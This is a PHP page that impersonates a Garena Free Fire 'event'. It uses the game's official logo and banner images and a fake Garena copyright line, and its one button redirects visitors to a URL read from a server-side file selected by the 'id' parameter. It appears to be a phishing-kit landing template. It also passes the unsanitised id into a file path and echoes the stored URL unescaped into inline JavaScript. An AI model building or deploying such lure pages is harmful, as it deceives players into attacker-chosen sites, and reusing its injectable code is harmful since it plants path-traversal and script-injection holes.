<?php
// include "../../../tools.php";

if(isset($_GET['id']) && !empty($_GET['id'])) {
    $url = $_GET['id'];
    // echo $url;
    $file_path = "../../data/$url.txt"; // Path lengkap ke file

    if(file_exists($file_path)) {
        $urlasli = file_get_contents($file_path);
        $parts = explode("|", $urlasli);
        // echo $parts[1];
        // echo $parts[0];
    } else {
        // File tidak ditemukan, tambahkan penanganan error di sini jika diperlukan
        // Misalnya, Anda bisa mengalihkan pengguna ke halaman login atau menampilkan pesan kesalahan
    }
} else {
    // ID tidak ada, tambahkan penanganan error di sini jika diperlukan
    // Misalnya, Anda bisa mengalihkan pengguna ke halaman login atau menampilkan pesan kesalahan
}
?>
<!doctype html> 
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Free Fire Event</title>
    <link href="https://api.gifan.id/files/20240216_bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <meta name="author" content="G-Code | www.g-code.co.id">
    <style>
        body {
          background-image: url("https://file.gifan.id/upload/files/SHJKGDEIUWKHDEimage.png");
        }
        
        .gcode-img {
          width: 100%;
          max-width: 370px;
          border-radius: 10px;
        }
        
        .gcode-btn {
          background-color: #ffba00;
          color: white;
          font-weight: bold;
        }
        
        .gcode-nav {
          background-color: black;
        }
        
        .gcode-burger {
          color: white;
        }
        
        .gCloud {
          padding-top: 1px;
        }
    </style>
  </head>
  <body>
    <nav class="navbar gcode-nav">
      <div class="container-fluid">
        <a class="navbar-brand" href="#">
          <img src="https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/full_logo.969f536.png" alt="Logo" height="28" width="auto" class="d-inline-block align-text-top gCloud">
        </a>
      </div>
    </nav>
    <div class="container mt-1">
      <center>
          <img src="https://dl.dir.freefiremobile.com/common/web_event/official2.ff.garena.all/202311/49ef48d0f7e0fb2487300043dd918083.jpg" class="gcode-img">
       </center>

      <div class="d-grid gap-2 mt-4">
          <button class="btn gcode-btn" onclick="window.location='<?= $parts[1] ?>';"><i class="fa-solid fa-arrow-right fa-beat-fade"></i> Klik disini untuk melanjutkan <i class="fa-solid fa-arrow-left fa-beat-fade"></i></button>
      </div>
      <div class="text-center fixed-bottom mb-3" style="color: white;"> Copyright &copy; Garena International<br /> 
<span style="font-size: 12px;">Trademarks belong to their respective owners. All rights reserved.</span> </div>
    </div>
    <script src="https://api.gifan.id/files/20240216_bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
    <script src="//file.gifan.id/fontawesome.js"></script>
  </body>
</html>
